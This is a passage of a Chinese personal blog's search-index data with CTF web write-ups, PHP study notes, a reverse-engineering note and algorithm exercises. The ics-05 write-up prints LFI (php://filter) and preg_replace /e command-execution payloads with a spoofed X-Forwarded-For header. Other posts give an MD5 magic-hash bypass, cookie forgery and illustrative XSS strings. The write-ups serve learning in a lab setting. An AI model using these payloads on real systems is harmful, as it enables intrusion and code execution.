be decrypted:\") C=input() print(\"Please enter key :\") key=int(input()) key = key % 26 Decryption(C, key, mode) if mode==\"3\": print(\"Please enter the content to be decrypted:\") C=input() key=1 while key&lt;26: Decryption(C, key, mode) key+=1 if mode!=\"1\"and mode!=\"2\" and mode!=\"3\": print(\"Error!\")if __name__ == '__main__': main()","categories":[{"name":"密码学","slug":"密码学","permalink":"https://singlemindedt.github.io/categories/密码学/"}],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://singlemindedt.github.io/tags/密码学/"}]},{"title":"初探栈溢出","slug":"初探栈溢出","date":"2019-10-10T14:09:17.000Z","updated":"2019-12-18T00:12:45.763Z","comments":true,"path":"2019/10/10/初探栈溢出/","link":"","permalink":"https://singlemindedt.github.io/2019/10/10/初探栈溢出/","excerpt":"","text":"这里给出一个简单的exe文件，实现的功能为：让用户键入密码，程序将之与固定密码(1234567)进行比较，如果错误继续键入，成功则提示“Congratulation! You have passed the verification!” 将程序拖入IDA，在左边窗口有函数名称列表，找到_main函数双击，可以看到其程序流程图： 伪代码： 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+0h] [ebp-8h]//变量v4 while ( 1 ) &#123; sub_4010A7(aPleaseInputPas, v4);//函数sub_4010A7需要调用两个参数aPleaseInputPas, v4 scanf(aS, &amp;v4);//输入v4 if ( !sub_401000(&amp;v4) )//若sub_401000(&amp;v4)==0调用 sub_4010A7(aIncorrectPassw, v4) break; sub_4010A7(aIncorrectPassw, v4); &#125; return sub_4010A7(aCongratulation, v4);&#125; 我们接下来查看 判断函数sub_401000： 1234567891011121314int __cdecl sub_401000(const char *a1)&#123; return strcmp(a1, a1234567);&#125;/*比较两个字符串设这两个字符串为str1，str2，若str1=str2，则返回零；若str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数。*/ 查看sub_4010A7： 12345678910int __cdecl sub_4010A7(int a1, int a2)&#123; int v2; // edi int v3; // ebx v2 = _stbuf(&amp;stru_4080E0); v3 = sub_401E34(&amp;stru_4080E0, a1, (int)&amp;a2); _ftbuf(v2, &amp;stru_4080E0); return v3;&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"}],"tags":[{"name":"re","slug":"re","permalink":"https://singlemindedt.github.io/tags/re/"}]},{"title":"ics-05","slug":"ics-05","date":"2019-10-05T02:53:52.000Z","updated":"2019-12-30T05:21:27.280Z","comments":true,"path":"2019/10/05/ics-05/","link":"","permalink":"https://singlemindedt.github.io/2019/10/05/ics-05/","excerpt":"","text":"ics-05题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统 实际操作：点击链接进入“工控云管理系统”，根据题目要求只能点击“设备维护中心”；得到如下页面： 除了index.php页面，没有其他有效信息，查看源码： 可以看到?page=indedx;由于出现page这个get参数，我们可以尝试一下是否存在文件包含源码漏洞； **本地文件包含漏洞（LFI漏洞）的黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞:主要涉及到的函数：include(),require()、include_once(),require_once()magic_quotes_gpc()、allow_url_fopen()、allow_url_include()、move_uploaded_file() 、readfile() file()、and file_get_contents()、upload_tmp_dir()、post_max_size()、and max_input_time()等典型漏洞代码：&lt;!–?php include($_GET[‘pages’].‘.php’); ?–&gt;参考文章：https://blog.csdn.net/qq_29419013/article/details/81202358**尝试读取index.php的页面源码，通过php内置协议直接读取代码：?page=php://filter/read=convert.base64-encode/resource=index.php得到很长一串base64编码，解码得到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140&lt;?phperror_reporting(0);@session_start();posix_setuid(1000);?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"renderer\" content=\"webkit\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"&gt; &lt;link rel=\"stylesheet\" href=\"layui/css/layui.css\" media=\"all\"&gt; &lt;title&gt;设备维护中心&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;ul class=\"layui-nav\"&gt; &lt;li class=\"layui-nav-item layui-this\"&gt;&lt;a href=\"?page=index\"&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;fieldset class=\"layui-elem-field layui-field-title\" style=\"margin-top: 30px;\"&gt; &lt;legend&gt;设备列表&lt;/legend&gt; &lt;/fieldset&gt; &lt;table class=\"layui-hide\" id=\"test\"&gt;&lt;/table&gt; &lt;script type=\"text/html\" id=\"switchTpl\"&gt; &lt;!-- 这里的 checked 的状态只是演示 --&gt; &lt;input type=\"checkbox\" name=\"sex\" value=\"&#123;&#123;d.id&#125;&#125;\" lay-skin=\"switch\" lay-text=\"开|关\" lay-filter=\"checkDemo\" &#123;&#123; d.id==1 0003 ? 'checked' : '' &#125;&#125;&gt; &lt;/script&gt; &lt;script src=\"layui/layui.js\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;script&gt; layui.use('table', function() &#123; var table = layui.table, form = layui.form; table.render(&#123; elem: '#test', url: '/somrthing.json', cellMinWidth: 80, cols: [ [ &#123; type: 'numbers' &#125;, &#123; type: 'checkbox' &#125;, &#123; field: 'id', title: 'ID', width: 100, unresize: true, sort: true &#125;, &#123; field: 'name', title: '设备名', templet: '#nameTpl' &#125;, &#123; field: 'area', title: '区域' &#125;, &#123; field: 'status', title: '维护状态', minWidth: 120, sort: true &#125;, &#123; field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true &#125; ] ], page: true &#125;); &#125;); &lt;/script&gt; &lt;script&gt; layui.use('element', function() &#123; var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块 //监听导航点击 element.on('nav(demo)', function(elem) &#123; //console.log(elem) layer.msg(elem.text()); &#125;); &#125;); &lt;/script&gt;&lt;?php$page = $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;else&#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt; &lt;?php if (strpos($page, 'input') &gt; 0) &#123; die(); &#125; if (strpos($page, 'ta:text') &gt; 0) &#123; die(); &#125; if (strpos($page, 'text') &gt; 0) &#123; die(); &#125; if ($page === 'index.php') &#123; die('Ok'); &#125; include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;&#125;//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt;&lt;/body&gt;&lt;/html&gt; 源码审计，得到如下可能存在问题的关键部分： 123456789101112131415161718192021&lt;?php//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 可以看到preg_replace函数（执行一个正则表达式的搜索和替换），可以利用preg_replace函数的命令执行漏洞在—/e模式下（即参数pattern输入为/e时）将replacement参数当作PHP代码执行（php5.5版本后已经废弃）；**关于preg_replace：https://www.php.net/manual/zh/function.preg-replace.php**先来测试一下，看能不能输出关于PHP配置的信息； 构造payload：/index.php?pat=/lww/e&amp;rep=phpinfo()&amp;sub=lww同时还得伪造X_FORWARDED_FOR=== ‘127.0.0.1’； 构造：验证成功！ 接下来尝试读取文件目录，利用system（）函数； 构造payload：/index.php?pat=/lww/e&amp;rep=system（“ls”）&amp;sub=lww cd查看s3chahahaDir文件system(“cd%20s3chahahaDir%26%26ls”): **%20url解释为空格、%26为&amp;** 得到flag文件，cd查看flag文件： 得到flag.php，使用cat查看内容：","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"正则表达式","slug":"正则表达式","date":"2019-10-04T06:34:42.000Z","updated":"2019-10-04T07:18:57.002Z","comments":true,"path":"2019/10/04/正则表达式/","link":"","permalink":"https://singlemindedt.github.io/2019/10/04/正则表达式/","excerpt":"","text":"https://c.runoob.com/front-end/854","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"}],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://singlemindedt.github.io/tags/正则表达式/"}]},{"title":"PHP学习","slug":"PHP学习","date":"2019-09-30T14:44:09.000Z","updated":"2019-10-03T13:33:07.472Z","comments":true,"path":"2019/09/30/PHP学习/","link":"","permalink":"https://singlemindedt.github.io/2019/09/30/PHP学习/","excerpt":"","text":"文章内容主要来自W3School，仅作为学习记录使用。 在 PHP 创建用户定义函数用户定义的函数声明以单词 “function” 开头： 语法123function functionName() &#123; 被执行的代码;&#125; 注释：函数名能够以字母或下划线开头（而非数字）。注释：函数名对大小写不敏感。提示：函数名应该能够反映函数所执行的任务。* 获得数组的长度 - count() 函数count() 函数用于返回数组的长度（元素数） 1234&lt;?php$cars=array(\"porsche\",\"BMW\",\"Volvo\");echo count($cars);?&gt; PHP 关联数组关联数组是使用您分配给数组的指定键的数组。有两种创建关联数组的方法： 12345$age=array(\"Bill\"=&gt;\"35\",\"Steve\"=&gt;\"37\",\"Elon\"=&gt;\"43\");或者：$age['Bill']=\"63\";$age['Steve']=\"56\";$age['Elon']=\"47\"; 随后可以在脚本中使用指定键： 123456&lt;?php$age=array(\"Bill\"=&gt;\"63\",\"Steve\"=&gt;\"56\",\"Elon\"=&gt;\"47\");echo \"Elon is \" . $age['Elon'] . \" years old.\";?&gt;Elon is 47 years old. PHP - 数组的排序函数在本节中，我们将学习如下 PHP 数组排序函数： 123456sort() - 以升序对数组排序rsort() - 以降序对数组排序asort() - 根据值，以升序对关联数组进行排序ksort() - 根据键，以升序对关联数组进行排序arsort() - 根据值，以降序对关联数组进行排序krsort() - 根据键，以降序对关联数组进行排序 GET vs. POSTGET 和 POST 都创建数组（例如，array( key =&gt; value, key2 =&gt; value2, key3 =&gt; value3, …)）。此数组包含键/值对，其中的键是表单控件的名称，而值是来自用户的输入数据。GET 和 POST 被视作 $_GET 和 $_POST。它们是超全局变量，这意味着对它们的访问无需考虑作用域 - 无需任何特殊代码，您能够从任何函数、类或文件访问它们。$_GET 是通过 URL 参数传递到当前脚本的变量数组。$_POST 是通过 HTTP POST 传递到当前脚本的变量数组。 何时使用 GET？通过 GET 方法从表单发送的信息对任何人都是可见的（所有变量名和值都显示在 URL 中）。GET 对所发送信息的数量也有限制。限制在大约 2000 个字符。不过，由于变量显示在 URL 中，把页面添加到书签中也更为方便。GET 可用于发送非敏感的数据。注释：绝不能使用 GET 来发送密码或其他敏感信息！ 何时使用 POST？通过 POST 方法从表单发送的信息对其他人是不可见的（所有名称/值会被嵌入 HTTP 请求的主体中），并且对所发送信息的数量也无限制。此外 POST 支持高阶功能，比如在向服务器上传文件时进行 multi-part 二进制输入。不过，由于变量未显示在 URL 中，也就无法将页面添加到书签。提示：开发者偏爱 POST 来发送表单数据。 表单元素表单的 HTML 代码是这样的： 1&lt;form method=\"post\" action=\"&lt;?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]);?&gt;\"&gt; 当提交此表单时，通过 method=”post” 发送表单数据。什么是 $_SERVER[“PHP_SELF”] 变量？$_SERVER[“PHP_SELF”] 是一种超全局变量，它返回当前执行脚本的文件名。因此，$_SERVER[“PHP_SELF”] 将表单数据发送到页面本身，而不是跳转到另一张页面。这样，用户就能够在表单页面获得错误提示信息。 什么是 htmlspecialchars() 函数？htmlspecialchars() 函数把特殊字符转换为 HTML 实体。这意味着 &lt; 和 &gt; 之类的 HTML 字符会被替换为 &lt; 和 &gt; 。这样可防止攻击者通过在表单中注入 HTML 或 JavaScript 代码（跨站点脚本攻击）对代码进行利用。 关于 PHP 表单安全性的重要提示$_SERVER[“PHP_SELF”] 变量能够被黑客利用！如果您的页面使用了 PHP_SELF，用户能够输入下划线然后执行跨站点脚本（XSS）。提示：跨站点脚本（Cross-site scripting，XSS）是一种计算机安全漏洞类型，常见于 Web 应用程序。XSS 能够使攻击者向其他用户浏览的网页中输入客户端脚本。假设我们的一张名为 “test_form.php” 的页面中有如下表单： 1&lt;form method=\"post\" action=\"&lt;?php echo $_SERVER[\"PHP_SELF\"];?&gt;\"&gt; 现在，如果用户进入的是地址栏中正常的 URL：”http://www.example.com/test_form.php&quot;，上面的代码会转换为： 1&lt;form method=\"post\" action=\"test_form.php\"&gt; 到目前，一切正常。不过，如果用户在地址栏中键入了如下 URL： 1http://www.example.com/test_form.php/%22%3E%3Cscript%3Ealert('hacked')%3C/script%3E 在这种情况下，上面的代码会转换为： 1&lt;form method=\"post\" action=\"test_form.php\"/&gt;&lt;script&gt;alert('hacked')&lt;/script&gt; 这段代码加入了一段脚本和一个提示命令。并且当此页面加载后，就会执行 JavaScript 代码（用户会看到一个提示框）。这仅仅是一个关于 PHP_SELF 变量如何被利用的简单无害案例。您应该意识到 标签内能够添加任何 JavaScript 代码！黑客能够把用户重定向到另一台服务器上的某个文件，该文件中的恶意代码能够更改全局变量或将表单提交到其他地址以保存用户数据，等等。如果避免 $_SERVER[\"PHP_SELF\"] 被利用？通过使用 htmlspecialchars() 函数能够避免 $_SERVER[\"PHP_SELF\"] 被利用。表单代码是这样的： 1&lt;form method=\"post\" action=\"&lt;?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]);?&gt;\"&gt; htmlspecialchars() 函数把特殊字符转换为 HTML 实体。现在，如果用户试图利用 PHP_SELF 变量，会导致如下输出： 1&lt;form method=\"post\" action=\"test_form.php/&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert('hacked')&amp;lt;/script&amp;gt;\"&gt; 无法利用，没有危害！ 通过 PHP 验证表单数据我们要做的第一件事是通过 PHP 的 htmlspecialchars() 函数传递所有变量。在我们使用 htmlspecialchars() 函数后，如果用户试图在文本字段中提交以下内容： 123&lt;script&gt;location.href('http://www.hacked.com')&lt;/script&gt;- 代码不会执行，因为会被保存为转义代码，就像这样：&amp;lt;script&amp;gt;location.href('http://www.hacked.com')&amp;lt;/script&amp;gt; 现在这条代码显示在页面上或 e-mail 中是安全的。在用户提交该表单时，我们还要做两件事：（通过 PHP trim() 函数）去除用户输入数据中不必要的字符（多余的空格、制表符、换行）（通过 PHP stripslashes() 函数）删除用户输入数据中的反斜杠（\\）接下来我们创建一个检查函数（相比一遍遍地写代码，这样效率更好）。我们把函数命名为 test_input()。现在，我们能够通过 test_input() 函数检查每个 $_POST 变量，脚本是这样的： 1234567891011121314151617181920实例&lt;?php// 定义变量并设置为空值$name = $email = $gender = $comment = $website = \"\";if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") &#123; $name = test_input($_POST[\"name\"]); $email = test_input($_POST[\"email\"]); $website = test_input($_POST[\"website\"]); $comment = test_input($_POST[\"comment\"]); $gender = test_input($_POST[\"gender\"]);&#125;function test_input($data) &#123; $data = trim($data); $data = stripslashes($data); $data = htmlspecialchars($data); return $data;&#125;?&gt; 请注意在脚本开头，我们检查了表单是否使用 $_SERVER[\"REQUEST_METHOD\"] 进行提交。如果 REQUEST_METHOD 是 POST，那么表单已被提交 - 并且应该对其进行验证。如果未提交，则跳过验证并显示一个空白表单。不过，在上面的例子中，所有输入字段都是可选的。即使用户未输入任何数据，脚本也能正常工作。下一步是制作必填输入字段，并创建需要时使用的错误消息。 关于正则表达式：记-正则表达式 PHP 表单验证 - 验证 E-mail 和 URLPHP - 验证名字以下代码展示的简单方法检查 name 字段是否包含字母和空格。如果 name 字段无效，则存储一条错误消息： 1234$name = test_input($_POST[\"name\"]);if (!preg_match(\"/^[a-zA-Z ]*$/\",$name)) &#123; $nameErr = \"只允许字母和空格！\"; &#125; 注释：preg_match() 函数检索字符串的模式，如果模式存在则返回 true，否则返回 false。 PHP - 验证 E-mail以下代码展示的简单方法检查 e-mail 1234$email = test_input($_POST[\"email\"]);if (!preg_match(\"/([\\w\\-]+\\@[\\w\\-]+\\.[\\w\\-]+)/\",$email)) &#123; $emailErr = \"无效的 email 格式！\"; &#125; PHP - 验证 URL以下代码展示的方法检查 URL 地址语法是否有效（这条正则表达式同时允许 URL 中的斜杠）。如果 URL 地址语法无效，则存储一条错误消息： 12345$website = test_input($_POST[\"website\"]);if (!preg_match(\"/\\b(?:(?:https?|ftp):\\/\\/|www\\.)[-a-z0-9+&amp;@#\\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\\/%=~_|]/i\",$website)) &#123; $websiteErr = \"无效的 URL\"; &#125; PHP - 验证 Name、E-mail、以及 URL现在，脚本是这样的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051实例&lt;?php// 定义变量并设置为空值$nameErr = $emailErr = $genderErr = $websiteErr = \"\";$name = $email = $gender = $comment = $website = \"\";if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") &#123; if (empty($_POST[\"name\"])) &#123; $nameErr = \"Name is required\"; &#125; else &#123; $name = test_input($_POST[\"name\"]); // 检查名字是否包含字母和空格 if (!preg_match(\"/^[a-zA-Z ]*$/\",$name)) &#123; $nameErr = \"Only letters and white space allowed\"; &#125; &#125; if (empty($_POST[\"email\"])) &#123; $emailErr = \"Email is required\"; &#125; else &#123; $email = test_input($_POST[\"email\"]); // 检查电邮地址语法是否有效 if (!preg_match(\"/([\\w\\-]+\\@[\\w\\-]+\\.[\\w\\-]+)/\",$email)) &#123; $emailErr = \"Invalid email format\"; &#125; &#125; if (empty($_POST[\"website\"])) &#123; $website = \"\"; &#125; else &#123; $website = test_input($_POST[\"website\"]); // 检查 URL 地址语言是否有效（此正则表达式同样允许 URL 中的下划线） if (!preg_match(\"/\\b(?:(?:https?|ftp):\\/\\/|www\\.)[-a-z0-9+&amp;@#\\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\\/% =~_|]/i\",$website)) &#123; $websiteErr = \"Invalid URL\"; &#125; &#125; if (empty($_POST[\"comment\"])) &#123; $comment = \"\"; &#125; else &#123; $comment = test_input($_POST[\"comment\"]); &#125; if (empty($_POST[\"gender\"])) &#123; $genderErr = \"Gender is required\"; &#125; else &#123; $gender = test_input($_POST[\"gender\"]); &#125;&#125;?&gt;","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"}]},{"title":"CumtCTF2019华为杯","slug":"CumtCTF2019华为杯","date":"2019-09-30T07:38:23.000Z","updated":"2019-12-13T05:35:27.088Z","comments":true,"path":"2019/09/30/CumtCTF2019华为杯/","link":"","permalink":"https://singlemindedt.github.io/2019/09/30/CumtCTF2019华为杯/","excerpt":"","text":"Web签到题点开链接为seed和hash参数的提交框，尝试admin，admin，返回Fail…;查看响应，发现有payload，提示访问index.php?source=1发现php代码: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?phpfunction gen_secured_random() &#123; // cause random is the way $a = rand(1337,2600)*42; $b = rand(1879,1955)*42; $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b; return $a+$b;&#125;function secured_hash_function($plain) &#123; // cause md5 is the best hash ever $secured_plain = sanitize_user_input($plain); return md5($secured_plain);&#125;function sanitize_user_input($input) &#123; // cause someone told me to never trust user input $re = '/[^a-zA-Z0-9]/';//re不为a-zA-Z0-9 $secured_input = preg_replace($re, \"\", $input); //preg_replace函数（搜索input中符合re正则的内容用“ ”代替，即去除不是a-zA-Z0-9） return $secured_input;&#125;/*&lt;?php // cause someone told me to never trust user input $input='&lt;&lt;&lt;&gt;&gt;&gt;.AZ.,,assddf23232????'; $re = '/[^a-zA-Z0-9]/';//re不为a-zA-Z0-9 $secured_input = preg_replace($re, \"\", $input); //preg_replace函数（搜索input中符合re正则的内容用“ ”代替，即去除非a-zA-Z0-9） echo $secured_input; ?&gt; run:AZassddf23232*/if (isset($_GET['source'])) &#123; show_source(__FILE__); die();&#125;require_once \"secret.php\";if (isset($_POST['s']) &amp;&amp; isset($_POST['h'])) &#123;//输入s,h //isset在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false。 //isset只能用于变量，因为传递任何其它参数都将造成解析错误 $s = sanitize_user_input($_POST['s']);//s=输入s $h = secured_hash_function($_POST['h']);//h=MD5（h） $r = gen_secured_random();//r=随机数 if($s != false &amp;&amp; $h != false) &#123; if($s.$r == $h) //弱类型比较 &#123;//连接s和r，即：用户输入s+随机数==用户输入h //*****此处利用0e漏洞，即0e+r==(填写hash为0开头字符) print \"Well done! Here is your flag: \".$flag; &#125; else &#123; print \"Fail...\"; &#125; &#125; else &#123; print \"&lt;p&gt;Hum ...&lt;/p&gt;\"; &#125;&#125;?&gt; 构造post传值： 1s=0e1&amp;h=QNKCDZO&amp;submit=Check Misc两岁半的猪打开压缩包为三只猪png，利用stegsolve发下有二维码； 寻找你的Key得到压缩包，解压发现需要密码，用binwalk文件分离，得到另外一个压缩包0.zip和kEy.exe将kEy.exe放进winhex,得到逆序图片base64编码逆序编码，转图片，得到二维码 委屈的兔兔将图片拖入winhex，得到Unicode 编码，直接百度解码得到 flag 302？还有其他？看到302，抓包，发现存在1ndex.php,访问1ndex.php发现RAW中有key和base64编码后的png图片，转图片，没有什么发现，直接站长工具解密带隐藏信息的图片，输入key，得到flag；（此处做一补充，当时利用binwalk -e分离文件得到一个空文本文件和一个zlib文件，利用脚本解密zlib文件应该也能成功，不过当时未跑出来）","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/tags/CTF/"}]},{"title":"暴跳老板+Flag在哪？+美味饼干","slug":"暴跳老板","date":"2019-09-25T14:49:02.000Z","updated":"2019-12-18T00:07:02.689Z","comments":true,"path":"2019/09/25/暴跳老板/","link":"","permalink":"https://singlemindedt.github.io/2019/09/25/暴跳老板/","excerpt":"","text":"暴跳老板随便输入内容，得到弹窗要以POST方式用Dear发邮件，抓包： 直接在postText后添加Dear=MyBoss，发包得到flag Flag在哪？burpsuit抓包，发现有五个跳转页面，但是都没有flag:)/where_is_flag.php/flag.php/I_have_a_frog.php/I_have_a_flag.php/no_flag.php看看大佬们骚操作，要组合一下 orz ，flagfrog.php,发包得到flag。 美味的饼干点击链接得到一个登录页面，尝试admin，111提示“登录成功，欢迎admin！”，但是并没有什么有用的信息。查看源代码，提示“只有admin才有flag”。检查请求头，有可疑Cookie： 1login=ZWUxMWNiYjE5MDUyZTQwYjA3YWFjMGNhMDYwYzIzZWU%3D base64解码： 1ee11cbb19052e40b07aac0ca060c23ee MD5解码：user 那么意思基本就清楚了，应该是要Cookie信息为admin，才能够得到flag adminMD5： 121232f297a57a5a743894a0e4a801fc3 base64: 1MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM= 更改Cookie，重发，在响应里看到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"最大子段和","slug":"最大子段和","date":"2019-09-24T14:18:31.000Z","updated":"2019-09-24T14:22:04.803Z","comments":true,"path":"2019/09/24/最大子段和/","link":"","permalink":"https://singlemindedt.github.io/2019/09/24/最大子段和/","excerpt":"","text":"问题D：最大子段和题目描述给定n 个整体组成的序列a1，a2，… an，求子段和a i + a i + 1 + … + a j（子段可为空集）的替代。 输入包含多组测试数据。第一行为一个整数T（1 &lt;= T &lt;= 20），代表测试数据个数。 每组测试数据第一行为一个整数n ，代表有n 个整数（1 &lt;= n &lt;= 10000）。 接下来一行有n 个数x（-1000 &lt;= x &lt;= 1000）。 输出输出其对应的最大子段和。 样例输入123162 -11 4 13 -1 2 样例输出118 提示子段可为空集，答案为0 代码：12345678910111213141516171819202122232425262728#include&lt;iostream&gt;using namespace std;int maxsum(int b[],int n)&#123; int tempsum=0; int Maxsum=0; for(int i=0;i&lt;n;i++) &#123; tempsum=(tempsum+b[i])&gt;b[i]?(tempsum+b[i]):b[i]; if(tempsum&gt;Maxsum) Maxsum=tempsum; &#125; return Maxsum;&#125;int main()&#123; int T; int n; while(cin&gt;&gt;T&gt;&gt;n) &#123; int a[10000]=&#123;0&#125;; for(int i=0;i&lt;n;i++) cin&gt;&gt;a[i]; int SUM=maxsum(a,n); cout&lt;&lt;SUM&lt;&lt;endl; return 0; &#125;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/tags/算法/"},{"name":"动态规划","slug":"动态规划","permalink":"https://singlemindedt.github.io/tags/动态规划/"}]},{"title":"汽水瓶","slug":"汽水瓶","date":"2019-09-24T09:41:42.000Z","updated":"2019-09-24T14:16:32.134Z","comments":true,"path":"2019/09/24/汽水瓶/","link":"","permalink":"https://singlemindedt.github.io/2019/09/24/汽水瓶/","excerpt":"","text":"问题 E: 汽水瓶【25】题目描述有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？ 输入输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n(1≤n≤100)，表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。 输出对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出 0 样例输入1234310810 样例输出1231540 代码：```C++ #includeusing namespace std;int main(){ int n=0; while(cin&gt;&gt;n) { int m=0;//最多可喝 if(n==0) { continue; } if(n==2)//第一次忘了这个初次n=2的情况 { cout&lt;&lt;1&lt;&lt;endl; continue;//此处若无会多输出 0 } else while(n&gt;2) { int bn=n; n=n/3+n%3; m+=bn/3; if(n==2) { m++; break; } } cout&lt;&lt;m&lt;&lt;endl; } return 0;}/*由规律可得如下方法： #includeusing namespace std;int main(){int num = 0; while (cin&gt;&gt;num) if (num == 0) continue; else cout&lt;&lt;num/2&lt;&lt;endl;//都是整除结果 return 0;}*/","categories":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/tags/算法/"}]},{"title":"最长公共子序列","slug":"最长公共子序列","date":"2019-09-24T08:02:54.000Z","updated":"2019-09-24T08:07:31.137Z","comments":true,"path":"2019/09/24/最长公共子序列/","link":"","permalink":"https://singlemindedt.github.io/2019/09/24/最长公共子序列/","excerpt":"","text":"问题 A: 最长公共子序列时间限制: 1 Sec 内存限制: 32 MB 题目描述给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？ 输入输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。 输出对于每组输入，输出两个字符串的最长公共子序列的长度。 样例输入123abcfbc abfcabprogramming contest abcd mnp 样例输出123420 代码： 12345678910111213141516171819202122#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;int main()&#123; string x; string z; int dp[105][105] =&#123;0&#125;; while(cin&gt;&gt;x&gt;&gt;z) &#123; int len1 = x.size();//8 int len2 = z.size();//9 for(int i =1; i &lt;= len1; i++) for(int j =1; j &lt;=len2; j++) if(x[i-1]==z[j-1])//i,j&gt;0,xi=zj dp[i][j] =dp[i - 1][j - 1] + 1; else dp[i][j]= max(dp[i][j-1], dp[i-1][j]);//i,j&gt;0,xi!=yj cout&lt;&lt;dp[len1][len2]&lt;&lt;endl; 